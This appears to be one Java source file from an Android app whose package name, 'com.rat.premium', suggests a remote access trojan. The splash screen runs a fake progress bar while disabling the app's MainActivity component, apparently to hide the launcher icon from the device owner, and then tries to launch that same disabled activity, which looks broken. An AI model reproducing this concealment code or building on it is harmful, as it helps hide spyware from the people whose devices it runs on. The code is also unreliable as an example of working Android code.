package com.rat.premium;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class SplashActivity extends AppCompatActivity {
    private ProgressBar progressBar;
    private TextView tvProgress;
    private int progress = 0;
    private Handler handler = new Handler();

    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.splash_activity);

        progressBar = findViewById(R.id.progressBar);
        tvProgress = findViewById(R.id.tvProgress);

        ComponentName cn = new ComponentName(this, MainActivity.class);
        getPackageManager().setComponentEnabledSetting(cn,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);

        handler.postDelayed(new Runnable() {
            @Override public void run() {
                if (progress < 100) {
                    progress += 5;
                    progressBar.setProgress(progress);
                    tvProgress.setText(progress + "%");
                    handler.postDelayed(this, 150);
                } else {
                    startActivity(new Intent(SplashActivity.this, MainActivity.class));
                    finish();
                }
            }
        }, 150);
    }
}
